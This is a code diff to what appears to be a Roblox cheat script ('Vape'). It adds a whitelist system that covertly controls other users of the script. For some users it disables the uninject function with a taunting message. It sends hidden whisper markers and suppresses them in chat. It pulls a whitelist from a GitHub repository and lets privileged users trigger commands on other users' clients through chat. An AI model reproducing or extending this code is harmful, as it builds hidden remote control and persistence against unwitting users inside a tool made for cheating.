@@ -442,15 +442,51 @@ run(function()
 		return false
 	end
 
-
-
+	local olduninject
+	function whitelist:playeradded(v, joined)
+		if self:get(v) ~= 0 then
+			if self.alreadychecked[v.UserId] then return end
+			self.alreadychecked[v.UserId] = true
+			self:hook()
+			if self.localprio == 0 then
+				olduninject = vape.Uninject
+				vape.Uninject = function()
+					notif('Vape', 'No escaping the private members :)', 10)
+				end
+				if joined then
+					task.wait(10)
+				end
+				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+					local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
+					local newchannel = cloneref(game:GetService('RobloxReplicatedStorage')).ExperienceChat.WhisperChat:InvokeServer(v.UserId)
+					if newchannel then
+						newchannel:SendAsync('helloimusingqpvxpe')
+					end
 					textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
 					textChatService.ChannelTabsConfiguration.Enabled = false
 				elseif replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
+					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..v.Name..' helloimusingqpvxpe', 'All')
 				end
 			end
 		end
 	end
+
+	function whitelist:process(msg, plr)
+		if plr == lplr and msg == 'helloimusingqpvxpe' then return true end
+
+		if self.localprio > 0 and not self.said[plr.Name] and msg == 'helloimusingqpvxpe' and plr ~= lplr then
+			self.said[plr.Name] = true
+			notif('Vape', plr.Name..' is using QP VAPE!', 60)
+			self.customtags[plr.Name] = {{
+				text = 'QP USER',
+				color = Color3.new(1, 1, 0)
+			}}
+			local newent = entitylib.getEntity(plr)
+			if newent then
+				entitylib.Events.EntityUpdated:Fire(newent)
+			end
+			return true
+		end
 
 		if self.localprio < self:get(plr) then
 			local args = msg:split(' ')
@@ -458,8 +494,8 @@ run(function()
 			local target = table.remove(args, 1)
 
 			for cmd, func in pairs(whitelist.commands) do
-				if mcmd:lower() == ":"..cmd:lower() then
-					if target == "@" then
+				if mcmd:lower() == ";"..cmd:lower() then
+					if target == "@v" then
 						func(args)
 					elseif getPlayerFromShortName(target) == lplr then
 						func(args)
@@ -516,6 +552,7 @@ run(function()
 				vape:Clean(exp:FindFirstChild('RCTScrollContentView', true).ChildAdded:Connect(function(obj)
 					obj = obj:FindFirstChild('BodyText', true)
 					if obj and obj:IsA('TextLabel') then
+						if obj.Text:find('helloimusingqpvxpe') then
 							obj.Parent.Parent.Visible = false
 						end
 					end
@@ -547,7 +584,7 @@ run(function()
 			local bubblechat = exp:WaitForChild('bubbleChat', 5)
 			if bubblechat then
 				vape:Clean(bubblechat.DescendantAdded:Connect(function(newbubble)
-					then
+					if newbubble:IsA('TextLabel') and newbubble.Text:find('helloimusingqpvxpe') then
 						newbubble.Parent.Parent.Visible = false
 					end
 				end))
@@ -558,19 +595,19 @@ run(function()
 	function whitelist:update(first)
 		local suc = pcall(function()
 			local _, subbed = pcall(function()
-				return game:HttpGet('nil')
+				return game:HttpGet('https://github.com/whitelist0bot/fadsfdsa/tree/main')
 			end)
 			local commit = subbed:find('currentOid')
 			commit = commit and subbed:sub(commit + 13, commit + 52) or nil
 			commit = commit and #commit == 40 and commit or 'main'
-			whitelist.textdata = game:HttpGet('nil'..commit..'/t.json', true)
+			whitelist.textdata = game:HttpGet('https://raw.githubusercontent.com/whitelist0bot/fadsfdsa/'..commit..'/t.json', true)
 		end)
 		if not suc or not hash or not whitelist.get then return true end
 		whitelist.loaded = true
 
 		if not first or whitelist.textdata ~= whitelist.olddata then
 			if not first then
-				whitelist.olddata = isfile('newvape/profiles/') and readfile('newvape/profiles/') or nil
+				whitelist.olddata = isfile('newvape/profiles/whitelist.json') and readfile('newvape/profiles/whitelist.json') or nil
 			end
 
 			local suc, res = pcall(function()
